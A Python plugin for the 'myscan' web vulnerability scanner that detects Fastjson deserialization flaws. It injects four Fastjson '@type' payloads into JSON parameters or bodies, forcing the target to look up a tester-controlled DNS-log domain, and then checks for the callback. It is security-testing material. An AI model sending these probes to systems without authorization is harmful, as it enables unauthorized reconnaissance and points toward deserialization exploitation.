#!/usr/bin/env python3
# @Time    : 2020-06-09
# @Author  : caicai
# @File    : others_fastjson_dnslog_found.py

from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.common import get_random_str, isjson
from myscan.lib.core.base import PocBase
from myscan.lib.core.common_reverse import generate, query_reverse
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.threads import mythread
from myscan.lib.core.data import cmd_line_options


class POC(PocBase):
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "fastjson_dnslog_found"
        self.vulmsg = "可尝试反序列化payload"
        self.level = 1  # 0:Low  1:Medium 2:High
        self.hexdatas = []

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        self.parse = dictdata_parser(self.dictdata)
        if not self.can_output(self.parse.getrootpath() + self.name):  # 限定只输出一次
            return

        # 针对参数为json格式
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")
        test_args = []
        for param in params:
            arg = param.get("value", "")
            if isjson(arg):
                test_args.append(param)

        # 针对body部分为json格式的数据包
        if self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
            test_args.append(None)
        payloads = ['''{"RANDOM": {"@type": "java.net.Inet4Address", "val": "DOMAIN"}}''',
                    '''Set[{"@type":"java.net.URL","val":"http://DOMAIN"}''',
                    '''{{"@type":"java.net.URL","val":"http://DOMAIN"}:0''',
                    '''{"@type":"java.net.InetSocketAddress"{"address":,"val":"DOMAIN"}}''',
                    ]
        if test_args:
            datas = []
            for payload in payloads:
                for arg_ in test_args:
                    datas.append((payload, arg_))
            mythread(self.send_payload, datas, cmd_line_options.threads)

        # query dns log
        sleep = True
        for param, hexdata in self.hexdatas:
            res, res_data = query_reverse(hexdata, sleep)
            sleep = False
            if res:
                self.result.append({
                    "name": self.name,
                    "url": self.parse.getrootpath(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others": "{} in dnslog".format(hexdata),
                        "param": "no param ,body vuln" if param is None else param.get("name", ""),
                        "request": self.parse.getrequestraw(),
                        "response": self.parse.getresponseraw()
                    }
                })
                self.can_output(self.parse.getrootpath() + self.name, True)
                return

    def send_payload(self, data):

        payload, param = data
        random_str = get_random_str(4).lower()
        # dns 方式检测
        _, hexdata = generate(self.parse.getfilepath(), "dns")
        self.hexdatas.append((param, hexdata))
        if param == None:
            req = self.parse.generaterequest({"data": payload.replace("RANDOM", random_str).replace("DOMAIN", hexdata)})
        else:
            req = self.parse.getreqfromparam(param, "w",
                                             payload.replace("RANDOM", random_str).replace("DOMAIN", hexdata))
        request(**req)
